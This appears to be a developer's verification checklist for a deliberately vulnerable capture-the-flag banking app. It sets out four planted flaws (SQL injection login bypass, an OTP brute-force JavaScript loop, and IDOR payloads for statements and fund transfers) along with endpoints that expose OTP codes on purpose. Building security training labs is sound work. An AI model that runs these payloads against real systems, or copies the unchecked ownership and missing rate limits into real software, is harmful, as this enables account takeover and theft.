# Final Vulnerabilities List - All Ready for Verification

**Date:** 2026-07-26  
**Status:** ✅ ALL COMPLETE & READY

---

## 🚀 4 Vulnerabilities Ready for Testing

---

## 1. auth.g1 — SQL Injection (Login)

**Type:** SQL Injection  
**Severity:** ⚠️ HIGH - Authentication bypass

**Exploitation Steps:**
```
1. Go to: http://localhost:9443/login
2. Customer ID: BS100234' or '1'='1
3. Password: anything
4. Click "Sign In"
```

**What Happens:**
- Server checks: `WHERE customer_id = 'BS100234' or '1'='1'`
- Condition always true → Login succeeds without valid password
- OTP form appears

**Flag Modal:**
```
✅ Modal appears with "🚩 FLAG CAPTURED!"
✅ Flag text: BANKSPLOIT{auth.g1-...}
✅ Copy button enabled, OK button disabled
✅ After copying, OK button enables
✅ Click OK → Redirects to OTP page
```

**OTP Access (NEW):**
```
✅ OTP form shows: "📱 View OTP Code" button
✅ Click button → Alert shows 4-digit OTP
✅ Enter OTP → Verify & Sign In
✅ Dashboard loads
```

**Parameter Used:** 
- Customer ID: `BS100234' or '1'='1`

**Files Involved:**
- `src/modules/auth/login.php` - Login form + OTP display
- `src/index.php` - /get-login-otp endpoint

**Status:** ✅ READY FOR VERIFICATION

---

## 2. auth.l10 — OTP Brute Force (No Rate Limiting)

**Type:** Insufficient Rate Limiting  
**Severity:** ⚠️ HIGH - OTP bypass

**Exploitation Steps:**
```
1. Login normally: BS100234 / password123
2. OTP form appears
3. Open DevTools: F12 → Console
4. Run brute force script (see below)
```

**Brute Force Script:**
```javascript
for(let i = 0; i <= 9999; i++) {
    const otp = String(i).padStart(4, '0');
    fetch('/api/v1/auth/verify-otp', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({otp: otp})
    }).then(r => r.json()).then(d => {
        if (d.ok || d.ctf_flag) {
            console.log('✅ Found OTP: ' + otp);
            console.log('Flag:', d.ctf_flag);
        }
    });
}
```

**What Happens:**
- Script tries all 10,000 OTP combinations (0000-9999)
- No rate limiting → Can try them all rapidly
- Server accepts correct OTP without penalty
- Response includes flag: `"ctf_flag": "BANKSPLOIT{auth.l10-...}"`

**Flag Modal:**
```
✅ Modal appears when correct OTP found
✅ Flag text: BANKSPLOIT{auth.l10-...}
✅ Copy/OK workflow functional
✅ Dashboard loads after OK
```

**Parameter Used:**
- OTP field: 0000-9999 (no rate limit)

**Files Involved:**
- `src/modules/auth/login.php` - OTP verification
- `src/modules/auth/_shared.php` - OTP validation logic

**Status:** ✅ READY FOR VERIFICATION

---

## 3. statements.l1 — IDOR (Account Statements)

**Type:** Insecure Direct Object Reference  
**Severity:** ⚠️ HIGH - Data disclosure

**Exploitation Steps - Method 1 (Direct URL):**
```
1. Login: BS100234 / password123
2. Verify OTP → Go to Statements
3. Change URL to: /statements?account_id=4
4. Press Enter
```

**Exploitation Steps - Method 2 (Via Form - NOW FIXED):**
```
1. Login: BS100234 / password123
2. Verify OTP → Go to Statements
3. In Account dropdown: Select a different account
4. Click "Apply filters" button
5. URL changes to: /statements?account_id=4&from_date=...&to_date=...
```

**What Happens:**
- Server reads `?account_id=4` from URL
- No ownership check at vuln levels
- Returns statements for account_id=4 (another user)
- Flag header sent: `X-CTF-Flag: BANKSPLOIT{statements.l1-...}`

**Flag Modal:**
```
✅ GET form request intercepted
✅ Modal appears with "🚩 FLAG CAPTURED!"
✅ Flag text: BANKSPLOIT{statements.l1-...}
✅ Copy button enabled, OK button disabled
✅ After copying, OK button enables
✅ Click OK → Page shows other user's statements
```

**Parameter Used:**
- `?account_id=4` (numeric account ID)

**Form Changes:**
- Form select: `name="account_id"` (was "account")
- Option values: Numeric IDs (was account numbers)
- When clicking "Apply filters": URL shows `?account_id=...`

**Files Involved:**
- `src/modules/statements/index.php` - Account selector + IDOR logic
- `src/templates/layout.php` - GET form interceptor

**Status:** ✅ READY FOR VERIFICATION

---

## 4. transfer.l1 — IDOR (Fund Transfer)

**Type:** Insecure Direct Object Reference  
**Severity:** ⚠️ CRITICAL - Money theft

**Exploitation Steps:**
```
1. Login: BS100234 / password123
2. Verify OTP → Go to Transfer
3. Fill transfer form:
   - Beneficiary: Select any (e.g., "John Doe")
   - Amount: 1000
   - Mode: IMPS
4. Click "Continue"
5. Click "Confirm & send OTP"
6. OTP page appears

7. IMPORTANT: Click "📱 View OTP Code" button
   → Alert shows 4-digit OTP (e.g., 1234)
   → Copy it

8. Open DevTools: F12 → Console
9. Run this command:
   document.querySelector('input[name="from_account_id"]').value = 4

10. Enter OTP in form field
11. Click "Authorise transfer"
```

**What Happens:**
- Server reads `from_account_id=4` from form
- No ownership check at vuln levels
- Deducts money from account_id=4 (another user)
- Sends money to selected beneficiary
- Flag header sent: `X-CTF-Flag: BANKSPLOIT{transfer.l1-...}`

**Flag Modal:**
```
✅ Form request intercepted
✅ Modal appears with "🚩 FLAG CAPTURED!"
✅ Flag text: BANKSPLOIT{transfer.l1-...}
✅ Copy button enabled, OK button disabled
✅ After copying, OK button enables
✅ Click OK → Receipt page appears
```

**Receipt Page Shows:**
```
✅ "✓ Transfer Successful" (with checkmark)
✅ From Account: "Savings · 1004444444" (account_id=4, NOT your account)
✅ To Account: "Savings · 1001111111" (beneficiary)
✅ Amount: ₹1000.00
✅ Mode: IMPS
✅ Status: completed
✅ Reference: IMPS...
✅ Date & Remarks
✅ "Download receipt" link returns HTML (not JSON)
```

**OTP Access (NEW):**
```
✅ "📱 View OTP Code" button on OTP page
✅ Click → Alert shows OTP code
✅ Can copy from alert and paste into form
```

**Parameter Used:**
- `from_account_id=4` (modified via console)

**Files Involved:**
- `src/modules/transfer/index.php` - Transfer flow + OTP display
- `src/modules/transfer/api.php` - Receipt endpoint (returns HTML)
- `src/index.php` - /get-transfer-otp endpoint

**Status:** ✅ READY FOR VERIFICATION

---

## Summary Table

| # | Vulnerability | Type | Parameter | Flag Modal | Status |
|---|---|---|---|---|---|
| 1 | auth.g1 | SQLi Login | `BS100234' or '1'='1` | ✅ Working | READY |
| 2 | auth.l10 | OTP Brute | 0000-9999 | ✅ Working | READY |
| 3 | statements.l1 | IDOR Statements | `?account_id=4` | ✅ Fixed | READY |
| 4 | transfer.l1 | IDOR Transfer | `from_account_id=4` | ✅ Fixed | READY |

---

## All Tests Include

✅ Flag modal popup with "🚩 FLAG CAPTURED!"  
✅ Copy button (must copy to enable OK)  
✅ OK button (enabled after copy)  
✅ X button (closes without copy)  
✅ Clear success indication  
✅ Account/transaction details visible  
✅ OTP Code viewing (login + transfer)  

---

## Files Modified This Session

| File | Lines | Changes |
|------|-------|---------|
| `src/modules/statements/index.php` | 80-86, 147-151 | Form field `account_id` + dropdown values numeric IDs |
| `src/templates/layout.php` | 348-365 | GET form interceptor support |
| `src/modules/transfer/api.php` | 60-131 | Receipt returns HTML with account names |
| `src/modules/auth/login.php` | 227-252 | View OTP Code button + JavaScript |
| `src/index.php` | 212-241 | Added /get-login-otp endpoint |

---

## Endpoints Created/Updated

| Endpoint | Type | Purpose | Status |
|---|---|---|---|
| `/get-login-otp` | GET | Fetch login OTP code | ✅ NEW |
| `/get-transfer-otp` | GET | Fetch transfer OTP code | ✅ EXISTING |
| `/api/v1/transfer/{id}/receipt` | GET | Transfer receipt (HTML) | ✅ UPDATED |

---

## Console Logs to Expect

### auth.g1 (SQLi)
```
Form submit event fired
Intercepting form submission: POST /login
X-CTF-Flag header: BANKSPLOIT{auth.g1-...}
Flag found in header: BANKSPLOIT{auth.g1-...}
```

### auth.l10 (OTP Brute)
```
Found OTP: 1234
Flag: BANKSPLOIT{auth.l10-...}
```

### statements.l1 (IDOR)
```
Form submit event fired
Intercepting form submission: GET /statements
GET form URL: /statements?account_id=4&from_date=...
Flag found in header: BANKSPLOIT{statements.l1-...}
```

### transfer.l1 (IDOR)
```
Form submit event fired
Intercepting form submission: POST /transfer
Flag found in header: BANKSPLOIT{transfer.l1-...}
Stored pending redirect, waiting for user to close modal
```

---

## ✅ Ready to Verify!

All 4 vulnerabilities are complete and ready for testing.

**Start with:** Test auth.g1 (SQLi) → auth.l10 (Brute) → statements.l1 (IDOR) → transfer.l1 (IDOR)

**Report any issues found during testing.**
